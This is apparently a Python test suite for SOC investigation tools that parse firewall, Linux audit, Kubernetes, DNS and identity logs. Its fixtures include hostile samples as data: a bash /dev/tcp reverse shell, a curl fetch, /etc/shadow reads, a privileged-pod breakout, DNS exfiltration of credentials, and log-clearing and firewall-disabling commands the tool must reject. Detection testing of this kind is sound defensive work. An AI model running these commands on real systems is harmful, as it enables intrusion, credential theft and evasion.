"""
Unit tests for the native SOC investigation tools:
- triage_security_alert
- gather_log_evidence
- lookup_threat_indicators
- compress_security_timeline
- propose_containment_response
"""

import pytest
from src.registry.tools.soc_tools import (
    triage_security_alert,
    gather_log_evidence,
    lookup_threat_indicators,
    compress_security_timeline,
    propose_containment_response,
)


@pytest.mark.asyncio
async def test_triage_security_alert_high_risk():
    alert_raw = (
        "CRITICAL ALERT: Unauthorized SSH brute force attack detected from 198.51.100.44. "
        "Failed logins exceeded 50 attempts in 60 seconds."
    )
    result_str = await triage_security_alert(alert_raw)
    assert "=== [SOC TRIAGE REPORT] ===" in result_str
    assert "Assigned Severity : HIGH" in result_str or "CRITICAL" in result_str
    assert "198.51.100.44" in result_str
    assert "Assessment: High probability of active security incident" in result_str


@pytest.mark.asyncio
async def test_gather_log_evidence_file_and_dir(tmp_path):
    log_dir = tmp_path / "logs"
    log_dir.mkdir()
    sample_log = log_dir / "auth.log"
    sample_log.write_text(
        "Sep 17 12:00:01 host sshd[1234]: Failed password for root from 198.51.100.44 port 4321 ssh2\n"
        "Sep 17 12:00:05 host sshd[1234]: Accepted password for admin from 10.0.0.5 port 5432 ssh2\n",
        encoding="utf-8",
    )

    res_str = await gather_log_evidence(str(log_dir), pattern="*.log")
    assert "=== [EVIDENCE COLLECTION:" in res_str
    assert "auth.log" in res_str
    assert "Total Artifacts Analyzed: 1 files" in res_str
    assert "Failed password" in res_str


@pytest.mark.asyncio
async def test_lookup_threat_indicators():
    res_pub = await lookup_threat_indicators("198.51.100.44")
    assert "=== [THREAT DISCOVERY: 198.51.100.44] ===" in res_pub
    assert "Type: IP" in res_pub
    assert "Public WAN Address" in res_pub
    assert "Suspected External C2" in res_pub

    res_priv = await lookup_threat_indicators("10.0.0.1")
    assert "RFC 1918 Private Internal Address" in res_priv
    assert "Risk Level: LOW" in res_priv

    res_hash = await lookup_threat_indicators("44d88612fea8a8f36de82e1278abb02f")
    assert "Type: HASH" in res_hash
    assert "Potential malicious binary" in res_hash


@pytest.mark.asyncio
async def test_compress_security_timeline():
    raw_logs = (
        "2026-09-17T12:00:01 host sshd: Failed password for root from 198.51.100.44\n"
        "2026-09-17T12:05:00 host sshd: Accepted password for user deploy\n"
        "2026-09-17T12:06:30 host auditd: Critical exec sudo curl http://malicious.bin\n"
    )
    res_str = await compress_security_timeline(raw_logs, max_timeline_events=5)
    assert "=== [COMPRESSED INCIDENT TIMELINE] ===" in res_str
    assert "Step 01:" in res_str
    assert "Step 02:" in res_str
    assert "Condensed timeline isolated threat sequence" in res_str


@pytest.mark.asyncio
async def test_propose_containment_response():
    res_str = await propose_containment_response(
        target_entity="198.51.100.44",
        action_type="block_ip",
        justification="Active SSH brute force and C2 egress",
        dry_run=True,
    )
    assert "=== [INCIDENT CONTAINMENT PLAN]" in res_str
    assert "Target Entity  : 198.51.100.44" in res_str
    assert "Action Type    : BLOCK_IP" in res_str
    assert "iptables" in res_str
    assert "Ready for operator approval" in res_str


@pytest.mark.asyncio
async def test_analyze_incident_impact():
    from src.registry.tools.soc_tools import analyze_incident_impact

    impact_report = await analyze_incident_impact("Compromised domain admin credentials on WKSTN-FIN-04")
    assert "=== [ENTERPRISE BLAST RADIUS & IMPACT ASSESSMENT REPORT] ===" in impact_report
    assert "WKSTN-FIN-04" in impact_report
    assert "DC01" in impact_report
    assert "da_admin" in impact_report
    assert "svc_backup_admin" in impact_report
    assert "452.8 MB" in impact_report


@pytest.mark.asyncio
async def test_compress_security_timeline_chronological_sorting():
    # Test with out-of-order timestamps: 10:25 -> 10:14 -> 10:32 -> 10:16
    raw_logs = (
        "[2026-09-14T10:25:00Z] Outbound C2 beaconing to 185.220.101.45:8443\n"
        "[2026-09-14T10:14:02Z] Spear-phishing email delivered with Invoice_90214.docm\n"
        "[2026-09-14T10:32:45Z] High-speed bulk exfiltration to 198.51.100.240:443\n"
        "[2026-09-14T10:16:32Z] Obfuscated PowerShell cradle spawned from WINWORD.EXE\n"
    )
    res_str = await compress_security_timeline(raw_logs, max_timeline_events=5)
    assert "=== [COMPRESSED INCIDENT TIMELINE] ===" in res_str
    lines = [l for l in res_str.splitlines() if "Phase" in l]
    # Verify strict ascending order
    assert "10:14:02" in lines[0]
    assert "10:16:32" in lines[1]
    assert "10:25:00" in lines[2]
    assert "10:32:45" in lines[3]


@pytest.mark.asyncio
async def test_path_healing_and_benchmark_sample(tmp_path):
    from src.core.path_utils import resolve_target_path

    # Simulate AST escaped path with \a (0x07) and \r (0x0d)
    mangled_path = "D:\\Security-logs-test\x07ttack-cases-benchmark\\case-1-apt-enterprise-intrusion\raw-logs"
    healed = resolve_target_path(mangled_path)
    assert "\x07" not in str(healed)
    assert "\r" not in str(healed)
    assert "attack-cases-benchmark" in str(healed)
    assert "raw-logs" in str(healed)


@pytest.mark.asyncio
async def test_cisco_asa_parser():
    from src.registry.tools.soc_tools import _parse_cisco_asa_records

    asa_logs = (
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49152 dst inside:10.10.10.20/21 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49153 dst inside:10.10.10.20/22 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49154 dst inside:10.10.10.20/23 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49155 dst inside:10.10.10.20/80 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49156 dst inside:10.10.10.20/443 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49157 dst inside:10.10.10.20/8080 by access-group \"outside_in\"\n"
        "%ASA-3-201011: Connection limit exceeded 5000/5000 for input packet from 198.51.100.220/1234 to 10.10.10.20/80 on interface outside\n"
        "%ASA-6-113015: AAA user authentication Rejected : reason = User password invalid : server = 10.10.10.1 : user = admin : user IP = 198.51.100.75\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.99/55555 dst inside:10.10.10.20/3389 by access-group \"outside_in\"\n"
    )
    total, findings, ips, users = _parse_cisco_asa_records(asa_logs, "cisco_asa_firewall.log")
    assert total == 9
    assert "198.51.100.220" in ips
    assert "198.51.100.75" in ips
    assert "admin" in users

    findings_text = "\n".join(findings)
    assert "Vertical Port Scan" in findings_text
    assert "Connection Limit DoS" in findings_text
    assert "Brute Force" in findings_text
    assert "BENIGN INTERNET NOISE" in findings_text


@pytest.mark.asyncio
async def test_pfsense_parser():
    from src.registry.tools.soc_tools import _parse_pfsense_records

    pfsense_logs = (
        # Vertical port scan from 198.51.100.50 against 10.10.10.20
        "4,1663412000,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54101,21,0,S,123,,,\n"
        "4,1663412001,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54102,22,0,S,124,,,\n"
        "4,1663412002,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54103,23,0,S,125,,,\n"
        "4,1663412003,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54104,80,0,S,126,,,\n"
        "4,1663412004,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54105,443,0,S,127,,,\n"
        "4,1663412005,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54106,8080,0,S,128,,,\n"
        # Lateral SMB sweep from 198.51.100.15 across 192.168.1.0/24 subnet
        "4,1663412010,em1,match,pass,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.15,192.168.1.10,49100,445,0,S,129,,,\n"
        "4,1663412011,em1,match,pass,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.15,192.168.1.11,49101,445,0,S,130,,,\n"
        "4,1663412012,em1,match,pass,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.15,192.168.1.12,49102,445,0,S,131,,,\n"
        # Trap 3 Benign noise from 198.51.100.99
        "4,1663412020,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.99,10.10.10.20,60000,3389,0,S,132,,,\n"
        # Internal authorized scanner 10.10.10.99
        "4,1663412030,em0,match,pass,in,4,0x0,,64,0,0,DF,6,tcp,60,10.10.10.99,10.10.10.20,50000,80,0,S,133,,,\n"
    )
    total, findings, ips = _parse_pfsense_records(pfsense_logs, "pfsense_filterlog.csv")
    assert total == 11
    assert "198.51.100.50" in ips
    assert "198.51.100.15" in ips
    assert "198.51.100.99" in ips
    assert "10.10.10.99" in ips

    findings_text = "\n".join(findings)
    assert "Vertical Port Scan" in findings_text
    assert "Horizontal Subnet Sweep" in findings_text
    assert "BENIGN INTERNET NOISE" in findings_text
    assert "BENIGN BASELINE AUDIT" in findings_text


@pytest.mark.asyncio
async def test_fortigate_parser():
    from src.registry.tools.soc_tools import _parse_fortigate_records

    fgt_logs = (
        'date=2026-09-17 time=14:22:01 devname="FGT-CORP-FW01" type="utm" subtype="ips" level="alert" severity="critical" srcip=198.51.100.200 dstip=10.10.10.20 srcport=43210 dstport=8080 attack="Apache.Log4j.Error.Log.Remote.Code.Execution" msg="Apache Log4j RCE attempt" action="dropped"\n'
        'date=2026-09-17 time=14:25:00 devname="FGT-CORP-FW01" type="anomaly" subtype="anomaly" severity="critical" srcip=198.51.100.88 dstip=198.51.100.10 attack="syn_flood" count=15000 msg="TCP SYN flood volumetric anomaly detected" action="clear_session"\n'
    )
    total, findings, ips, cves = _parse_fortigate_records(fgt_logs, "fortigate_traffic_ips.log")
    assert total == 2
    assert "198.51.100.200" in ips
    assert "198.51.100.88" in ips
    assert "CVE-2021-44228" in cves

    findings_text = "\n".join(findings)
    assert "Log4j Remote Code Execution" in findings_text
    assert "Volumetric Network Denial of Service" in findings_text


@pytest.mark.asyncio
async def test_multi_firewall_gather_evidence_and_noise_discrimination(tmp_path):
    asa_file = tmp_path / "cisco_asa_firewall.log"
    asa_file.write_text(
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49152 dst inside:10.10.10.20/21 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49153 dst inside:10.10.10.20/22 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49154 dst inside:10.10.10.20/23 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49155 dst inside:10.10.10.20/80 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49156 dst inside:10.10.10.20/443 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49157 dst inside:10.10.10.20/8080 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.99/55555 dst inside:10.10.10.20/3389 by access-group \"outside_in\"\n",
        encoding="utf-8"
    )

    report = await gather_log_evidence(str(tmp_path), pattern="*.log")
    assert "=== [EVIDENCE COLLECTION:" in report
    assert "cisco_asa_firewall.log" in report
    assert "Vertical Port Scan" in report
    assert "198.51.100.220" in report
    assert "FALSE-POSITIVE TRAP & BENIGN BASELINE DISCRIMINATION" in report
    assert "198.51.100.99" in report


@pytest.mark.asyncio
async def test_containment_anti_forensic_rejection():
    # Attempting to clear event logs must be rejected
    rejected_res = await propose_containment_response(
        target_entity="Clear-EventLog -LogName Security",
        action_type="isolate_endpoint",
        justification="Clean up test logs"
    )
    assert "CONTAINMENT POLICY VIOLATION: DESTRUCTIVE ACTION REJECTED" in rejected_res
    assert "strictly PROHIBITED" in rejected_res

    # Attempting to turn firewall state off must be rejected
    rejected_fw = await propose_containment_response(
        target_entity="WKSTN-01",
        action_type="isolate_endpoint",
        justification="netsh advfirewall set allprofiles state off"
    )
    assert "CONTAINMENT POLICY VIOLATION: DESTRUCTIVE ACTION REJECTED" in rejected_fw


@pytest.mark.asyncio
async def test_linux_audit_and_dmesg_parsers():
    from src.registry.tools.soc_tools import _parse_linux_audit_records, _parse_linux_dmesg_records

    audit_logs = (
        'type=SYSCALL msg=audit(1789461535.123:455): arch=c000003e syscall=257 success=yes exit=3 a0=5 a1=... auid=1001 uid=0 comm="cat" exe="/usr/bin/cat" key="shadow_access"\n'
        'type=PATH msg=audit(1789461535.123:455): item=0 name="/etc/shadow" nametype=NORMAL\n'
        'type=SYSCALL msg=audit(1789461735.123:456): arch=c000003e syscall=313 success=yes exit=0 auid=1001 uid=0 comm="insmod" exe="/usr/bin/kmod" key="kernel_module_load"\n'
        'type=EXECVE msg=audit(1789461935.123:457): argc=3 a0="/bin/bash" a1="-c" a2="bash -i >& /dev/tcp/198.51.100.77/4444 0>&1"\n'
    )
    total_a, findings_a, ips_a, users_a = _parse_linux_audit_records(audit_logs, "linux_audit.log")
    assert total_a == 4
    assert "198.51.100.77" in ips_a
    assert "UID:1001" in users_a
    findings_a_text = "\n".join(findings_a)
    assert "Loadable Kernel Module (LKM) Injection" in findings_a_text
    assert "Credential Dumping / Shadow File Access" in findings_a_text
    assert "Command & Scripting Execution" in findings_a_text

    dmesg_logs = (
        "[   45.123456] diamorphine: loading out-of-tree module taints kernel.\n"
        "[   45.123510] [diamorphine] loaded successfully: hooked sys_call_table at 0xffffffff82000280\n"
        "[   85.123456] process 24891 (nsenter) entering host pid namespace\n"
        "[  120.123456] TCP: Possible SYN flooding on port 443.\n"
    )
    total_d, findings_d = _parse_linux_dmesg_records(dmesg_logs, "linux_dmesg_syslog.log")
    assert total_d == 4
    findings_d_text = "\n".join(findings_d)
    assert "LKM Rootkit & Kernel Taint" in findings_d_text
    assert "Container Breakout / Host Namespace Escape" in findings_d_text
    assert "BENIGN KERNEL WARNING" in findings_d_text


@pytest.mark.asyncio
async def test_k8s_audit_and_linux_auth_parsers():
    from src.registry.tools.soc_tools import _parse_k8s_audit_records, _parse_linux_auth_records

    k8s_logs = (
        '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"create","user":{"username":"system:serviceaccount:frontend-apps:webapp-sa"},"sourceIPs":["10.244.1.45"],"objectRef":{"resource":"pods","namespace":"kube-system","name":"system-health-diagnostics-pod"},"requestObject":{"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"breakout","image":"alpine:3.18","command":["nsenter"]}],"volumes":[{"name":"host-root","hostPath":{"path":"/"}}]}}}\n'
        '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"create","user":{"username":"system:serviceaccount:frontend-apps:webapp-sa"},"sourceIPs":["10.244.1.45"],"objectRef":{"resource":"clusterrolebindings","name":"system-cluster-admin-binding"},"requestObject":{"roleRef":{"name":"cluster-admin"},"subjects":[{"kind":"ServiceAccount","name":"webapp-sa"}]}}\n'
    )
    total_k, findings_k, ips_k, users_k = _parse_k8s_audit_records(k8s_logs, "k8s_api_audit.json")
    assert total_k == 2
    assert "10.244.1.45" in ips_k
    assert "system:serviceaccount:frontend-apps:webapp-sa" in users_k
    findings_k_text = "\n".join(findings_k)
    assert "Container Escape via Privileged Pod" in findings_k_text
    assert "Control Plane Takeover / RBAC Escalation" in findings_k_text

    auth_logs = (
        "Sep 14 08:34:22 host sudo: www-data : user NOT in sudoers ; TTY=pts/2 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow\n"
        "Sep 14 08:38:10 host crontab[16201]: (www-data) REPLACE (www-data)\n"
        "Sep 14 08:41:50 host sudo: deploy : TTY=pts/3 ; USER=root ; COMMAND=/bin/bash\n"
        "Sep 14 08:14:02 host sudo: sysadmin : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/systemctl status nginx\n"
    )
    total_auth, findings_auth, ips_auth, users_auth = _parse_linux_auth_records(auth_logs, "linux_auth.log")
    assert total_auth == 4
    assert "www-data" in users_auth
    assert "deploy" in users_auth
    findings_auth_text = "\n".join(findings_auth)
    assert "Sudo Abuse / Unauthorized Privilege Escalation" in findings_auth_text
    assert "Crontab Persistence Injection" in findings_auth_text
    assert "Local Account Pivot & Root Shell" in findings_auth_text
    assert "BENIGN BASELINE ADMIN MAINTENANCE" in findings_auth_text


@pytest.mark.asyncio
async def test_dns_log_parser_tunnel_dga_and_hex_exfil():
    from src.registry.tools.soc_tools import _parse_dns_log_records

    dns_logs = (
        # DNS Tunneling TXT queries
        "14-Sep-2026 11:05:10.012 queries: info: client @0x7f8a1 192.168.10.142#54123 (000101a4.tunnel.c2server.org): query: 000101a4.tunnel.c2server.org IN TXT + (10.0.0.2) whoami\n"
        "14-Sep-2026 11:05:10.230 queries: info: client @0x7f8a1 192.168.10.142#54124 (000101a5.tunnel.c2server.org): query: 000101a5.tunnel.c2server.org IN TXT + (10.0.0.2) root\n"
        "14-Sep-2026 11:05:10.450 queries: info: client @0x7f8a1 192.168.10.142#54125 (000101a6.tunnel.c2server.org): query: 000101a6.tunnel.c2server.org IN TXT + (10.0.0.2) ok\n"
        "14-Sep-2026 11:05:10.670 queries: info: client @0x7f8a1 192.168.10.142#54126 (000101a7.tunnel.c2server.org): query: 000101a7.tunnel.c2server.org IN TXT + (10.0.0.2) sync\n"
        # Hex-encoded Subdomain Exfiltration (admin:Password1 and 23!:root/etc/sh)
        "14-Sep-2026 11:18:01.015 queries: info: client @0x7f8a2 192.168.10.88#54127 (61646d696e3a50617373776f726431.chunk1.exfil.badactor.net): query: 61646d696e3a50617373776f726431.chunk1.exfil.badactor.net IN A + (10.0.0.2)\n"
        "14-Sep-2026 11:18:01.215 queries: info: client @0x7f8a2 192.168.10.88#54128 (3233213a726f6f742f6574632f7368.chunk2.exfil.badactor.net): query: 3233213a726f6f742f6574632f7368.chunk2.exfil.badactor.net IN A + (10.0.0.2)\n"
        # DGA NXDOMAIN Queries
        "14-Sep-2026 11:12:30.100 queries: info: client @0x7f8a3 192.168.10.205#54129 (x8q1zm9vb21akz.biz): query: x8q1zm9vb21akz.biz IN A + (10.0.0.2) NXDOMAIN\n"
        "14-Sep-2026 11:12:30.300 queries: info: client @0x7f8a3 192.168.10.205#54130 (dj82mc7v19awzq.info): query: dj82mc7v19awzq.info IN A + (10.0.0.2) NXDOMAIN\n"
        "14-Sep-2026 11:12:30.500 queries: info: client @0x7f8a3 192.168.10.205#54131 (zla04kqncm91x.top): query: zla04kqncm91x.top IN A + (10.0.0.2) NXDOMAIN\n"
        # Benign CDN and Spamhaus
        "14-Sep-2026 11:02:18.001 queries: info: client @0x7f8a4 192.168.10.60#54132 (d3g8q11abc29fg.cloudfront.net): query: d3g8q11abc29fg.cloudfront.net IN A + (10.0.0.2)\n"
        "14-Sep-2026 11:03:00.001 queries: info: client @0x7f8a5 192.168.10.5#54133 (12.1.168.192.zen.spamhaus.org): query: 12.1.168.192.zen.spamhaus.org IN A + (10.0.0.2)\n"
    )
    total_dns, findings_dns, ips_dns, doms_dns = _parse_dns_log_records(dns_logs, "bind9_dns_queries.log")
    assert total_dns == 11
    assert "192.168.10.142" in ips_dns
    assert "192.168.10.88" in ips_dns
    assert "192.168.10.205" in ips_dns
    findings_dns_text = "\n".join(findings_dns)
    assert "DNS Tunneling C2 Channel" in findings_dns_text
    assert "Covert DNS Data Exfiltration" in findings_dns_text
    assert "admin:Password1" in findings_dns_text
    assert "Algorithmic DGA Domain Generation & C2 Hunting" in findings_dns_text
    assert "BENIGN BASELINE DNS" in findings_dns_text


@pytest.mark.asyncio
async def test_dynamic_flow_aggregator_beacon_and_exfil():
    from src.registry.tools.soc_tools import _parse_firewall_traffic_records

    fw_logs = (
        # 60s periodic C2 Beaconing from 10.20.10.142 to 185.220.101.5:8443
        "2026-09-14 11:20:00,10.20.10.142,185.220.101.5,8443,bytes_sent=520,bytes_rcvd=140,rule=Allow-Outbound\n"
        "2026-09-14 11:21:01,10.20.10.142,185.220.101.5,8443,bytes_sent=522,bytes_rcvd=142,rule=Allow-Outbound\n"
        "2026-09-14 11:22:00,10.20.10.142,185.220.101.5,8443,bytes_sent=518,bytes_rcvd=138,rule=Allow-Outbound\n"
        "2026-09-14 11:23:01,10.20.10.142,185.220.101.5,8443,bytes_sent=524,bytes_rcvd=141,rule=Allow-Outbound\n"
        # 3.84 GB Bulk Exfiltration from 10.20.10.88 to 198.51.100.240:443
        "2026-09-14 11:38:40,10.20.10.88,198.51.100.240,443,bytes_sent=3842109400,bytes_rcvd=142050,rule=Web-Outbound\n"
        # Authorized S3 Cloud Backup: 5.42 GB to 52.216.148.10:443 with Backup-To-Cloud
        "2026-09-14 11:40:00,10.20.10.12,52.216.148.10,443,bytes_sent=5420000000,bytes_rcvd=200000,rule=Backup-To-Cloud,user=svc-backup\n"
    )
    total_fw, findings_fw, ips_fw, users_fw, doms_fw = _parse_firewall_traffic_records(fw_logs, "paloalto_traffic.log")
    assert total_fw == 6
    assert "10.20.10.142" in ips_fw
    assert "10.20.10.88" in ips_fw
    assert "185.220.101.5" in ips_fw
    assert "198.51.100.240" in ips_fw
    findings_fw_text = "\n".join(findings_fw)
    assert "C2 Beaconing" in findings_fw_text
    assert "Data Exfiltration" in findings_fw_text
    assert "3.58 GB" in findings_fw_text or "3.84 GB" in findings_fw_text
    assert "BENIGN BASELINE ENTERPRISE TRAFFIC" in findings_fw_text


@pytest.mark.asyncio
async def test_identity_and_ueba_parser():
    from src.registry.tools.soc_tools import _parse_identity_logs

    id_logs = (
        # Cisco ASA AnyConnect VPN
        "%ASA-6-113015: AAA user authentication Rejected : reason = User password invalid : user = david.clark : user IP = 185.220.101.5\n"
        "%ASA-6-113015: AAA user authentication Rejected : reason = User password invalid : user = david.clark : user IP = 185.220.101.5\n"
        "%ASA-6-113039: Group <DfltGrpPolicy> User <david.clark> IP <185.220.101.5> AnyConnect parent session started.\n"
        "%ASA-4-722051: Group <DfltGrpPolicy> User <david.clark> IP <185.220.101.5> IPv4 Address <10.200.1.15> assigned to session\n"
        # Entra ID Impossible Travel for john.doe (US Seattle to Frankfurt within 30 min)
        '{"userPrincipalName":"john.doe@enterprise.com","createdDateTime":"2026-09-14T08:00:00Z","ipAddress":"198.51.100.10","location":{"city":"Seattle","countryOrRegion":"US","geoCoordinates":{"latitude":47.6062,"longitude":-122.3321}},"status":{"errorCode":0}}\n'
        '{"userPrincipalName":"john.doe@enterprise.com","createdDateTime":"2026-09-14T08:30:00Z","ipAddress":"194.165.16.104","location":{"city":"Frankfurt","countryOrRegion":"DE","geoCoordinates":{"latitude":50.1109,"longitude":8.6821}},"status":{"errorCode":0}}\n'
        # Pass-the-PRT / Anomalous Token for senior.engineer
        '{"userPrincipalName":"senior.engineer@enterprise.com","createdDateTime":"2026-09-14T09:00:00Z","ipAddress":"185.196.220.14","appDisplayName":"Azure PowerShell","riskDetail":"anomalousToken","deviceDetail":{"isCompliant":false},"status":{"errorCode":0}}\n'
        # Cellular Roaming Whitelist for alice.wang
        '{"userPrincipalName":"alice.wang@enterprise.com","createdDateTime":"2026-09-14T09:10:00Z","ipAddress":"172.56.21.8","location":{"city":"Dallas","countryOrRegion":"US"},"status":{"errorCode":0}}\n'
        '{"userPrincipalName":"alice.wang@enterprise.com","createdDateTime":"2026-09-14T09:12:00Z","ipAddress":"172.56.21.44","location":{"city":"Dallas","countryOrRegion":"US"},"status":{"errorCode":0}}\n'
        # Typo Whitelist for charlie.brown (fails and retries 15s later)
        '{"userPrincipalName":"charlie.brown@enterprise.com","createdDateTime":"2026-09-14T09:20:00Z","ipAddress":"198.51.100.55","status":{"errorCode":50126}}\n'
        '{"userPrincipalName":"charlie.brown@enterprise.com","createdDateTime":"2026-09-14T09:20:15Z","ipAddress":"198.51.100.55","status":{"errorCode":0}}\n'
    )
    total_id, findings_id, ips_id, users_id = _parse_identity_logs(id_logs, "identity_logs.log")
    assert "david.clark" in users_id
    assert "john.doe@enterprise.com" in users_id
    assert "senior.engineer@enterprise.com" in users_id
    assert "alice.wang@enterprise.com" in users_id
    findings_id_text = "\n".join(findings_id)
    assert "Compromised Valid VPN Account" in findings_id_text
    assert "Impossible Travel Anomaly" in findings_id_text
    assert "Pass-the-PRT / Anomalous Token Replay" in findings_id_text
    assert "BENIGN CELLULAR ROAMING" in findings_id_text
    assert "BENIGN USER TYPO" in findings_id_text

